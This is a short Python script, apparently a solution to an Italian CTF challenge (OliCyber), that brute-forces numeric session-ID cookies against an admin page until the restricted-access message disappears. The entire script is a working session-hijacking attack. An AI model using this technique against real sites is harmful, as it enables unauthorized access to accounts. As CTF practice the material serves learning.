from requests import *

for i in range(2000): 

    dati = {
        "session_id" : str(i)
    }
    
    r = get("http://too-small-reminder.challs.olicyber.it/admin", cookies=dati)

    if "riservata" not in r.text:
        print(r.text)
        print("i = ", i)
        break